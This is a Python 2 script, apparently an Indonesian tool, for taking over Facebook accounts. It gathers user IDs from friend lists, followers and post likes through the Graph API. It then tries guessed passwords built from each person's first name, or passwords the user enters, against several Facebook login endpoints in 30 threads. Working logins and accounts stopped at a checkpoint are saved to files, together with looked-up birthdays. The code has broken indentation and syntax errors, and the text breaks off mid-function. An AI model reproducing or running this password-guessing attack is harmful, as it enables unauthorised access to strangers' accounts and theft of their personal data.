#!/usr/bin/python2
# coding=utf-8
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
 warna = random.choice(my_color)
p='\033[1;97m'
k='\033[1;93m'
m='\033[1;91m'
H = '\x1b[1;92m' # HIJAU
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text

id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan1 = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'Nopember',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
day = current
op = bulan1[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))
hari = datetime.now().strftime('%A')
jam = datetime.now().strftime('%H:%M:%S')
bulan = {
        "01": "Januari",
        "02": "Februari",
        "03": "Maret",
        "04": "April",
        "05": "Mei",
        "06": "Juni",
        "07": "Juli",
        "08": "Agustus",
        "09": "September",
        "10": "November",
        "11": "Oktober",
        "12": "Desember"}
        
        def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def defaultua():
    ua = random.choice([NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00",
   "Opera/9.80 (Windows NT 6.0; U; bg) Presto/2.7.62 Version/11.01",
   "Mozilla/5.0 (Linux; Android 10; ELS-NX9; HMSCore 6.0.0.306) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 HuaweiBrowser/11.1.1.310 Mobile Safari/537.36",
   "Mozilla/5.0 (Nokia 3310; 64; rv:88.0) Gecko/20200101 Firefox/62.0",
   "OperaMini(Nokia3310FW10.03.11_2;Opera Mini/4.4.39014;en-GB",
   "nokian73-1/UC Browser7.0.0.41/69/400 UNTRUSTED/1.0",
   "Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; Nokia 6630/6.0 1657) Opera 8.60",
   "Opera/2.0 (J2ME/MIDP; Opera Mini; en; U; ssr)",
   "Opera/8.0 (J2 ME/MIDP; Opera Mini/ 2.0.4509 /1724; ru; U; ssr)",
   "Opera/8.0 (J2ME/MIDP; Opera Mini/2.0 ua/uk; U; ssr)"
   "NokiaN73/UC Browser7.0.0.41/28/400",
   "Opera/9.8 (iPhone; Opera Mini/5.0 U; ru)"])
   try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError, IOError):
        logs()

def gantiua():
    os.system("rm -rf ugent.txt")
    ua = raw_input("\n [?] masukan user agent kamu : ")
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
        jalan("\n [*] sukses mengganti user agent")
        print("\n [*] user agent kamu : \x1b[1;92m" +ua)
        pler = raw_input("\n \x1b[1;97m[?] apakah ingin mengganti user agent? (Y/t): ")
        if pler == "":
        	menu()
        elif pler == "Y" or pler == "y":
        	gantiua()
        elif pler == "T" or pler == "t":
        	menu ()
    except (KeyError, IOError):
        jalan("\n [*] gagal mengganti user agent")
        raw_input("\n [•] kembali")
        menu()
        
        def logo():
	os.system("clear")
	print("""
   \x1b[1;92m
   \x1b[1;92m ░░░░░░░░░░░░░░░▓▓███████▓▒░░░░
   \x1b[1;92m ░░░░░░░░░░░▓██████▓▓▓▓▓██████▓
   \x1b[1;92m ░░░░░░░░░████▒░░░░░░░░░░░░░▓██
   \x1b[1;92m ██░░░░░░░░░
   \x1b[1;92m ░░░░░░███▓░░░░░░░░░░░░░░░░░░░
   \x1b[1;92m ▓██▒░░░░░░░
   \x1b[1;92m ░░░░░░██▓░░░░░░░░░░░░░░░░░░░░░
   \x1b[1;92m ░░██▓░░░░░░
   \x1b[1;92m ░░░██░░▓▓▓▓▓▓▓▒░░░░░░░░░░▒▓███
   \x1b[1;92m ░░██░▒███████▓▒▒░░░░░░░░▒█████
   """)
   
   def tokenz():
	os.system('clear')
	try:
		token = open('login.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		logo()
		print""+p+""
		print" [+] Cara Ambil Token Bisa Cek Di https://youtu.be/IdxphPBMMTU"
		token = raw_input('\n [+] Masukkan Token : ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('login.txt', 'w')
			zedd.write(token)
			zedd.close()
			menu()
		except KeyError:
			print("[!] Token Invalid!")
			sys.exit()
			
def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print'[!] Token Invalid!'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print'[!] Tidak Ada Koneksi!'
        sys.exit()

    logo()
    print""+p+"  * script masih dalam tahap pengembangan, maklum kalo ada bug"
    print""
    print" [+] Author      : Soni Ganteng/GodOfSadboy."
    print" [+] Github      : https://github.com/Godsadboy"
    print" [+] ----------------------------------------"
    print" [+] Bergabung   : %s %s %s" % (ha, op, ta)
    print" [+] Status      : "+H+"Premium"
    print""+p+" [+] ----------------------------------------"
    print" [+] ID          : " +id
    print" [+] IP          : " +ip
    print""
    print" [ selamat datang \033[1;93m"+nama+"\033[0;97m ]"
    print""
    print""+p+" [01]. crack dari pencarian nama"
    print" [02]. crack dari id publik"
    print" [03]. crack dari followers"
    print" [04]. crack dari like postingan"
    print" [05]. crack dari postingan grup"
    print" [06]. crack dari publik target"
    print" [07]. informasi tambahan"
    print(" ["+m+"00"+p+"]. logout (token)")
    print""
    ask = raw_input(" [?] pilih : ")
    if ask == "":
    	menu()
    elif ask == "1" or ask == "01":
    	pencarian()
    elif ask == "2" or ask == "02":
    	publik()
    elif ask == "3" or ask == "03":
    	followers()
    elif ask == "4" or ask == "04":
    	likes()
    elif ask == "5" or ask == "05":
    	postgrup()
    elif ask == "6" or ask == "06":
    	publikold()
    elif ask == "7" or ask == "07":
    	infotambahan()
    elif ask == "0" or ask == "00":
    	os.system('rm -f login.txt')
    	jalan(" [!] berhasil menghapus token ")
    	exit()
    else:
    	jalan(" [!] pilih yang bener ! ")
    	menu() 
    
def infotambahan():
    print""
    print" [1]. setting user agent"
    print" [2]. lihat hasil crack"
    print" [3]. laporkan bug script"
    print" [4]. informasi token/cookies"
    print" [5]. keluar"
    print""
    pk = raw_input(" [?] pilih : ")
    if pk == "":
    	menu()
    elif pk == "1" or pk == "01":
    	return gantiua()
    elif pk == "2" or pk == "02":
    	cekakun()
    elif pk == "3" or pk == "03":
    	laporbug()
    elif pk == "4" or pk == "04":
    	infologin()
    elif pk == "5" or pk == "05":
    	menu()
    
def pencarian():
	jalan(" [•] maaf fitur ini belum tersedia sekarang \n [•] silahkan tunggu update terbaru")
	print""
	raw_input(" [•] kembali ")
	menu()
	
def postgrup():
	jalan(" [•] maaf fitur ini belum tersedia sekarang \n [•] silahkan tunggu update terbaru")
	print""
	raw_input(" [•] kembali ")
	menu()
	
def publik():
    print(" [*] isi 'me' jika ingin crack dari daftar teman")
    idt = raw_input(' [+] masukkan id atau username : ')
    if idt == "":
    	menu()
    try:
        mmk = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        kntl = json.loads(mmk.text)
        #print' [+] Nama : ' + sp['name']
    except KeyError:
        print'[!] ID Tidak Tersedia!'
        menu()

    ajg = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
    ppk = json.loads(ajg.text)
    for i in ppk['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)
    print""
    print' [+] total id -> \033[1;91m' + str(len(id))
    pilihpw(ppk)
    
def followers():
    print(" [*] isi 'me' jika ingin crack dari followers sendiri")
    idt = raw_input(' [?] masukan id atau username followers : ')
    if idt == "":
    	menu()
    try:
        mmk = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        kntl = json.loads(mmk.text)
        #print' [+] Nama : ' + sp['name']
    except KeyError:
        print'[!] ID Tidak Tersedia!'
        menu()

    ajg = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
    ppk = json.loads(ajg.text)
    for i in ppk['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)
    print""
    print' [+] total id -> \033[1;91m' + str(len(id))
    pilihpw(ppk)
    
def likes():
    idt = raw_input(' [?] masukkan url atau id postingan : ')
    if idt == "":
    	menu()
    ajg = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token)
    ppk = json.loads(ajg.text)
    for i in ppk['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)
    print""
    print' [+] total id -> \033[1;91m' + str(len(id))
    pilihpw(ppk)
    
def publikold():
	print(" [*] minimal 2 target dan maksimal 5 target")
	limt = raw_input(' [?] masukkan jumlah target : ')
	if limt =='':
		print (' [!] isi yang benar')
		menu()
	elif limt == '2':
		idt1 = raw_input(" [1] id target 1 : ")
		idt2 = raw_input(" [2] id target 2 : ")
		lim = raw_input(' [?] limit per id : ')
		try:
			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 1 tidak ada !')
		try:
			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 2 tidak ada !')
	elif limt == '3':
		idt1 = raw_input(" [1] id target 1 : ")
		idt2 = raw_input(" [2] id target 2 : ")
		idt3 = raw_input(" [3] id target 3 : ")
		lim = raw_input(' [?] limit per id : ')
		try:
			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 1 tidak ada !')
		try:
			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 2 tidak ada !')
		try:
			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 3 tidak ada !')
	elif limt == '4':
		idt1 = raw_input(" [1] id target 1 : ")
		idt2 = raw_input(" [2] id target 2 : ")
		idt3 = raw_input(" [3] id target 3 : ")
		idt4 = raw_input(" [3] id target 4 : ")
		lim = raw_input(' [?] limit per id : ')
		try:
			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 1 tidak ada !')
		try:
			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 2 tidak ada !')
		try:
			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 3 tidak ada !')
		try:
			r = requests.get("https://graph.facebook.com/"+idt4+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 4 tidak ada !')
	elif limt == '5':
		idt1 = raw_input(" [1] id target 1 : ")
		idt2 = raw_input(" [2] id target 2 : ")
		idt3 = raw_input(" [3] id target 3 : ")
		idt4 = raw_input(" [4] id target 4 : ")
		idt5 = raw_input(" [5] id target 5 : ")
		lim = raw_input(' [?] limit per id : ')
		try:
			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 1 tidak ada !')
		try:
			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 2 tidak ada !')
		try:
			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 3 tidak ada !')
		try:
			r = requests.get("https://graph.facebook.com/"+idt4+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 4 tidak ada !')
		try:
			r = requests.get("https://graph.facebook.com/"+idt5+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 5 tidak ada !')
			
	print""
	print' [+] total id -> \033[1;91m' + str(len(id))
	pilihpw(ppk)

def cekakun():
    print'\n [1]. lihat hasil crack OK '
    print' [2]. lihat hasil crack CP '
    anjg = raw_input('\n [?] pilih : ')
    if anjg == '':
        menu()
    elif anjg == '01' or anjg == '1':
        print'\n [+] Hasil \x1b[0;92mOK\x1b[1;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[1;97m' % (ha, op, ta)
        os.system(' cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
        raw_input("\n [•] Kembali ")
        menu()
    elif anjg == '02' or anjg == '2':
        totalcp = open('out/CP-%s-%s-%s.txt' % (ha, op, ta)).read().splitlines()
        print '\n [•] Hasil CP Tanggal : \x1b[0;92m%s-%s-%s\x1b[1;97m' % (ha, op, ta)
        print " \033[1;97m[•] Total : %s" %(len(totalcp))
        print""
        os.system(' cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
        raw_input("\n [•] Kembali ")
        menu()
    else:
        print(' [!] Pilih Yang Benar!')
        menu()
 
def laporbug():
	asulo = raw_input("\n [?] masukan laporan bug script : ")
	if asulo == "":
		menu()
	os.system('xdg-open https://wa.me/6285229323951?text=' +asulo)


       
def infologin():
	print""
	print "\n [*] token : "+token
	print ""
	raw_input(" [•] kembali ")
	menu()
	
def pilihpw(file):
	hg = raw_input(""+p+" [?] apakah anda ingin menggunakan sandi manual? [Y/t] : ")
	if hg == "":
		pilihpw(file)
	elif hg == "Y" or hg == "y":
		manual(file)
	elif hg == "T" or hg == "t":
		otomatis(file)
	else:
		print(" [!] Pilih Yang Bener")
		pilihpw()
		
def manual(file):
	print""
	print(" [?] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata sandi minimal 6 karakter atau lebih")
	print""
	pwzx = raw_input(' [?] masukan kata sandi : ')
	print ' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwzx, N)
	if len(pw) == 5:
		exit('[!] Isi Yang Benar, Tidak Boleh Kosong!')
	manualnjing(file)
	
def manualnjing(file):
	print("")
	print(""+p+" [ pilih metode crack - silahkan coba satu² ]")
	print("")
	print(" [1] metode api (fast)")
	print(" [2] metode mbasic (slow)")
	print(" [3] metode free.fb (fast)")
	print("")
	x = raw_input(" [?] metode : ")
	if x == "":
		print(" [!] Pilih Yang Benar!")
		manualnjing(file)
	elif x == '1':
		bapiman()
	elif x == '2':
		mbasicman()
	elif x == '3':
		freefbman()
	else:
		print(" [!] Pilih Yang Benar")
		exit()
		
def bapiman():
    ua = 'ua'
    pw = 'pwzx'
    print'\n [+] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' [+] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print("\n [!] anda bisa menjeda proses crack dengan mematikan data seluler")
    print("")

    def main(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print'\r\x1b[1;97m [*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                ua_apim = {'user-agent': ua}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
                   'format': 'json', 
                   'sdk_version': '2', 
                   'email': uid, 
                   'locale': 'en_US', 
                   'password': asu, 
                   'sdk': 'ios', 
                   'generate_session_cookies': '1', 
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                api = 'https://b-api.facebook.com/method/auth.login'
                response = requests.get(api, params=param, headers=ua_apim)
                if 'session_key' in response.text and 'EAAA' in response.text:
                    print'\r\x1b[0;92m*--> ' + uid + ' | ' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('*--> ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'www.facebook.com' in response.json()['error_msg']:
                    print'\r\x1b[1;93m  * -->' + uid + '|' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Selesai'
    exit()
    
def mbasicman():
    ua = 'ua'
    pw = 'pwzx'
    print'\n [+] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' [+] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print("\n [!] anda bisa menjeda proses crack dengan mematikan data seluler")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[1;97m [*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua })
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;92m*--> ' + uid + ' | ' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('*--> ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    print'\r\x1b[1;93m  * --> ' + uid + '|' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass
    
    
    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Selesai'
    exit()
    
def freefbman():
    ua = 'ua'
    pw = 'pwzx'
    print'\n [+] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' [+] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print("\n [!] anda bisa menjeda proses crack dengan mematikan data seluler")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[1;97m [*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua })
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;92m*--> ' + uid + ' | ' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('*--> ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    print'\r\x1b[1;93m  * --> ' + uid + '|' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass
    
    
    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Selesai'
    exit()
    
def otomatis(file):
	print("")
	print(""+p+" [ pilih metode crack - silahkan coba satu² ]")
	print("")
	print(" [1] metode api (fast)")
	print(" [2] metode mbasic (slow)")
	print(" [3] metode free.fb (fast)")
	print(" [4] metode m.fb (very slow)")
	print("")
	z = raw_input(" [?] metode : ")
	if z == "":
		print(" [!] Pilih Yang Benar!")
		manualnjing(file)
	elif z == '01' or z == '1':
		bapi()
	elif z == '02' or z == '2':
		mbasic()
	elif z == '03' or z == '3':
		freefb()
	elif z == '04' or z == '4':
		mfb()
	else:
		print(" [!] Pilih Yang Benar")
		exit()
		
def bapi():
	print'\n [+] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
	print' [+] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
	print("\n [!] anda bisa menjeda proses crack dengan mematikan data seluler")
	print("")

	def main(arg):
		global ok,cp,ua, loop
		print '\r \033[0;97m[*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") ##Gk Usah Di Ganti Ajg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345']:
				uas = "ua"
				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': uas, 
				'content-type': 'application/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=headers_)
				if "session_key" in send.text and "EAAA" in send.text:
					print '\r  \033[0;92m*--> ' +uid+ ' | ' + pw + '        '
					ok.append(uid+' | '+pw)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  *--> '+str(uid)+' | '+str(pw)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					try:
						token = open('login.txt').read()  
						sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
						b = json.loads(sw.text)
						graph = b["birthday"]
						month, day, year = graph.split("/")
						month = bulan[month]
						print'\r\x1b[1;93m  * --> ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
						cp.append(uid + ' | ' + pw + ' | ' + day + ' ' + month + ' ' + year)
						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
						save.write('  * --> ' + str(uid) + '|' + str(pw) + ' | ' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
						save.close()
						break
					except(KeyError, IOError):
						graph = " "
					except:pass
					print'\r\x1b[1;93m  * --> ' + uid + '|' + pw + '                        '
					cp.append(uid + ' | ' + pw)
					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
					save.write('  * --> ' + str(uid) + '|' + str(pw) +                        '\n')
					save.close()
					break
					continue
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print "\n [+] crack selesai..."
	exit()

def mbasic():
    ua = 'ua'
    print'\n [+] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' [+] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print("\n [!] anda bisa menjeda proses crack dengan mematikan data seluler")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[1;97m [*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345']:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua })
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print'\\1b[0;92m [OK] ' + uid + ' | ' + pw + '                  '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [OK] ' + str(uid) + ' | ' + str(pw) + '               \n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b["birthday"]
                        month, day, year = graph.split("/")
                        month = bulan[month]
                        print'\r\x1b[1;93m  * --> ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + ' | ' + pw + ' | ' + day + ' ' + month + ' ' + year)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write('  * --> ' + str(uid) + '|' + str(pw) + ' | ' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        graph = " "
                    except:pass
                    print'\r\x1b[1;93m  * --> ' + uid + '|' + pw + '                        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(pw) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n [+] crack selesai...'
    exit()
        
def freefb():
    uas = 'ua'
    print'\n [+] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' [+] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print("\n [!] anda bisa menjeda proses crack dengan mematikan data seluler")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[1;97m [*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower(), name.lower() + '1234', name.lower() + '12345', name.lower() + '123']:
                url = "https://free.facebook.com/login.php"
                kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
